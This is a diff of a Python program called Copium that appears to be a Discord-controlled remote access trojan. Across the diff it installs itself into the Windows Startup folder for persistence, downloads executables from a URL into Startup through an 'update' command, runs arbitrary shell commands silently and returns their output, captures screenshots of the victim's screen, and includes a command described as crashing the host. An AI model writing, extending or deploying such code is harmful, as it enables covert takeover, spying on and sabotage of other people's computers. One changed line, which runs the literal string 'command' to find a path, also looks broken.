@@ -22,7 +22,7 @@ else:
     silent = 0
 
 file_name = file_path.split("\\")[-1]
-copium_ver = 1.27
+copium_ver = 1.28
 whoami = f"{os.getlogin()}-{random.choice(string.ascii_uppercase)}{random.randint(0, 9)}"
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
@@ -30,17 +30,10 @@ current_login = None
 
 def persistence():
     startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    local_appdata_path = os.getenv('LOCALAPPDATA')
-
-    # if not executed in localappdata
-    if file_path != os.path.join(local_appdata_path, file_name):
-        # copy itself to localappdata
-        subprocess.run(f"copy \"{file_path}\" \"{local_appdata_path}", shell=True, creationflags=silent)
-
-    if f"{file_name}.bat" not in os.listdir(startup_folder_path):
-        # creates a batch to execute file inside localappdata
-        with open(os.path.join(startup_folder_path, file_name + ".bat"), "w") as f:
-            f.write(f"start {os.path.join(local_appdata_path, file_name)}")
+    # if not executed in startup
+    if file_path != os.path.join(startup_folder_path, file_name):
+        # copies itself to startup
+        subprocess.run(f"copy \"{file_path}\" \"{startup_folder_path}", shell=True, creationflags=silent)
 
 
 def log_command(ctx, args=None, error=False):
@@ -52,6 +45,14 @@ def log_command(ctx, args=None, error=False):
             content = " " + args
         command = f"{ctx.prefix}{ctx.command}{content}"
     return f'{ctx.author} {"caused an error using" if error else "executed"} "{command}" in "#{ctx.channel}" at {datetime.now().strftime("%H:%M:%S")}'
+
+
+def onefile_exit():
+    # if built with pyinstaller
+    if getattr(sys, 'frozen', False):
+        sys.exit()
+    else:
+        quit()
 
 
 @client.event
@@ -86,7 +87,8 @@ async def lock_command(ctx):
     print(log_command(ctx))
 
 
-@client.hybrid_command(name="download", with_app_command=True, description="downloads from the url to the execution path")
+@client.hybrid_command(name="download", with_app_command=True,
+                       description="downloads from the url to the execution path")
 async def download_command(ctx, url, filename=None):
     if current_login != whoami:
         return
@@ -145,6 +147,44 @@ async def version_command(ctx):
     print(log_command(ctx))
 
 
+@client.hybrid_command(name="whoami", with_app_command=True, description="tells the running host")
+async def whoami_command(ctx):
+    if current_login != whoami:
+        return
+    await ctx.reply(f"I am {whoami}", ephemeral=True)
+    print(log_command(ctx))
+
+
+@client.hybrid_command(name="exit", with_app_command=True, description="exits the bot")
+async def exit_command(ctx):
+    if current_login != whoami:
+        return
+
+    await ctx.reply(f"{whoami} exiting", ephemeral=True)
+    onefile_exit()
+
+
+@client.hybrid_command(name="update", with_app_command=True, description="updates the host")
+async def update_command(ctx, url=None, name=None):
+    if current_login != whoami:
+        return
+
+    print(log_command(ctx))
+    startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if not url:
+        url = "https://github.com/Arthurszzz/rcbot/blob/master/Copium.exe?raw=true"
+    if not name:
+        name = os.path.join(startup_folder_path, "Copium.exe")
+    else:
+        name = os.path.join(startup_folder_path, name)
+    await ctx.reply(f"{whoami} is trying to update", ephemeral=True)
+    r = requests.get(url)
+    with open(name, 'wb') as file:
+        for chunk in r.iter_content(chunk_size=8192):
+            if chunk:
+                file.write(chunk)
+
+
 @client.hybrid_command(name="playsound", with_app_command=True, description="plays a wav file in the background")
 async def playsound_command(ctx, filepath):
     if current_login != whoami:
@@ -162,11 +202,13 @@ async def screenshot_command(ctx, path=None):
     if path:
         path = os.path.join(path, "ss.png")
     else:
-        path = "ss.png"
+        userprofile = subprocess.run("command", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout
+        path = os.path.join(userprofile, "ss.png")
     pyautogui.screenshot(path)
     await ctx.reply(file=discord.File(path), ephemeral=True)
-    os.remove(path)
     print(log_command(ctx))
+    await asyncio.sleep(1)
+    os.remove(path)
 
 
 @client.hybrid_command(name="bsod", with_app_command=True, description="makes the host's computer die instantly")
@@ -189,7 +231,8 @@ async def cmd_command(ctx, *, command, timeout: int = 30):
     await ctx.reply(f'terminal response for "{command}" incoming:', ephemeral=True)
     await asyncio.sleep(0.1)
 
-    command_result = subprocess.run(command, shell=True, timeout=timeout, capture_output=True, encoding='cp858', creationflags=silent).stdout
+    command_result = subprocess.run(command, shell=True, timeout=timeout, capture_output=True, encoding='cp858',
+                                    creationflags=silent).stdout
 
     max_length = 2000
     if len(command_result) > max_length:
@@ -201,17 +244,6 @@ async def cmd_command(ctx, *, command, timeout: int = 30):
     else:
         await ctx.reply(f'{command} did not return any results', ephemeral=True)
     print(log_command(ctx, command))
-
-
-@client.hybrid_command(name="execute", with_app_command=True, description="executes a shell command in the host")
-async def execute_command(ctx, *, command):
-    if current_login != whoami:
-        return
-
-    await ctx.reply(f'"{command}" scheduled', ephemeral=True)
-    print(log_command(ctx, command))
-    subprocess.run(command, shell=True, creationflags=silent)
-    await ctx.reply(f'"{command}" got executed successfully', ephemeral=True)
 
 
 @client.hybrid_command(name="site", with_app_command=True, description="opens the specified site in the host")
